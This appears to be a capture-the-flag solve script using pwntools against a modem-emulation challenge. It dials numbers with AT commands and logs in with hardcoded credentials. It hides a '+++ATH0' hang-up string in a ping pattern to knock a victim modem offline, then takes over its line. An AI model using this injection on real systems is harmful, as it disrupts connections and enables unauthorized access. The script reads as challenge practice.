ticket = 'ticket{quebec55907juliet:GHiY5i4nwJfklpPXN5Q58IEd6pHYbYwhf7puiGaCHjMrgIYnFA6QyobXW2NwHc86pw}'

from pwn import *

my_server_num = "2155550141"

their_server_ip = "93.184.216.34"
their_server_num = "4265550189"

r = remote("modem.satellitesabove.me", 5052)
r.sendlineafter("Ticket please:\n", ticket)

r.newline = b'\n'
r.recvuntil("Connected to")

# Connect to 'my server' using credentials from my_note.txt
r.sendline(f"ATDT {my_server_num}")
r.sendlineafter("Username: ", "hax")
r.sendlineafter("Password: ", "hunter2")

# +++ATH0 ping of doom to disconnect the remote server from whoever they're talking to
payload = b'+++ATH0\r'.hex() # Must be \r, not \n, and the length must divide 16
r.sendlineafter("fakesh-4.4$ ", f"ping -p {payload} {their_server_ip}")

# +++ATH0 locally to disconnect from 'my server'
r.sendline("+++ATH0")
r.recvuntil("OK")

r.sendline(f"ATDT {their_server_num}")
r.sendlineafter('Username:', 'manrocket')
r.sendlineafter('Password:', '8487')
r.interactive()
